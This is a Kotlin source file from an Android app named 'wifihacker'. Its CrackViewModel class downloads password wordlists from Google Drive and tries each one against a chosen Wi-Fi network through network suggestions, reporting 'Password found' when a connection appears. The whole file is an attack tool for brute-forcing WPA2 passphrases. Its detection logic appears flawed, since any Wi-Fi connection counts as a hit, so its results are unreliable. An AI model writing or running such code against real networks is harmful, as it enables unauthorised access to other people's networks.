package com.hereliesaz.wifihacker

import android.app.Application
import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiNetworkSuggestion
import android.net.wifi.WifiManager
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class CrackViewModel(application: Application) : AndroidViewModel(application) {

    private val _status = MutableStateFlow("Idle")
    val status: StateFlow<String> = _status

    private val _progress = MutableStateFlow(0)
    val progress: StateFlow<Int> = _progress

    private val wifiManager = application.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val connectivityManager = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    @RequiresApi(Build.VERSION_CODES.Q)
    fun startCracking(ssid: String, detail: String) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            _status.value = "Cracking not supported on this Android version."
            return
        }

        viewModelScope.launch(Dispatchers.IO) {
            _status.value = "Downloading dictionaries..."
            val passwords = downloadDictionaries()
            _status.value = "Passwords loaded, cracking now..."

            for ((index, password) in passwords.withIndex()) {
                _progress.value = index * 100 / passwords.size
                val suggestion = WifiNetworkSuggestion.Builder()
                    .setSsid(ssid)
                    .setWpa2Passphrase(password)
                    .build()

                val suggestions = listOf(suggestion)
                val status = wifiManager.addNetworkSuggestions(suggestions)
                if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
                    _status.value = "Failed to suggest network"
                    return@launch
                }

                registerNetworkCallback(password)
                kotlinx.coroutines.delay(5000) // 5 second timeout for each password
            }
            _status.value = "Failed to crack password."
        }
    }

    private fun registerNetworkCallback(password: String) {
        val networkRequest = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .build()

        val networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                _status.value = "Password found: $password"
                connectivityManager.unregisterNetworkCallback(this)
            }
        }
        connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
    }

    private suspend fun downloadDictionaries(): List<String> {
        val passwords = mutableListOf<String>()
        val urls = listOf(
            "https://drive.google.com/file/d/12ohN_3CktkNUGlDwHP-hzawpaqTEaMem/view?usp=drive_link",
            "https://drive.google.com/file/d/1FHAd6hnQoyKtoJzqak3f1koFQ-jlw65P/view?usp=drive_link",
            "https://drive.google.com/file/d/1xF_-ZLONJE9GkeHMp9GxRJpt3BqlCgO-/view?usp=drive_link",
            "https://drive.google.com/file/d/1Tn09w5kzccSZra13iGB5HpD7zMWwVRVS/view?usp=drive_link",
            "https://drive.google.com/file/d/11uWVOmuMPl-564mKz996uNmm3OVGpBqq/view?usp=drive_link",
            "https://drive.google.com/file/d/1G4pkjSNoKJWyjoI8l5-iCPdWlWyLKcBn/view?usp=drive_link",
            "https://drive.google.com/file/d/168ednlVlBdIL0NrJqFBKusmLG5uRSI5I/view?usp=drive_link",
            "https://drive.google.com/file/d/1_T-B7g4elsKb_qIYTqr-Jl8uxKYS1943/view?usp=drive_link",
            "https://drive.google.com/file/d/1JMoCTjOW1luWsrhgGp4kPWi4EJCnIakC/view?usp=drive_link",
            "https://drive.google.com/file/d/1GM8SV6hxPx3mTtwdNjSnjJyyFydT8ixP/view?usp=drive_link",
            "https://drive.google.com/file/d/1VC9TOuWdmAtjD7Z4Yb29pK7-SELOC-bM/view?usp=drive_link",
            "https://drive.google.com/file/d/1lSLJquH6WPGp_3yxVsODL1x3ZYlUYihw/view?usp=drive_link"
        )

        for (url in urls) {
            try {
                val fileId = url.split("/d/")[1].split("/")[0]
                val downloadUrl = "https://drive.google.com/uc?export=download&id=$fileId"
                val u = URL(downloadUrl)
                val c = u.openConnection() as HttpURLConnection
                c.requestMethod = "GET"
                c.connect()
                val reader = BufferedReader(InputStreamReader(c.inputStream))
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    passwords.add(line!!)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return passwords
    }
}
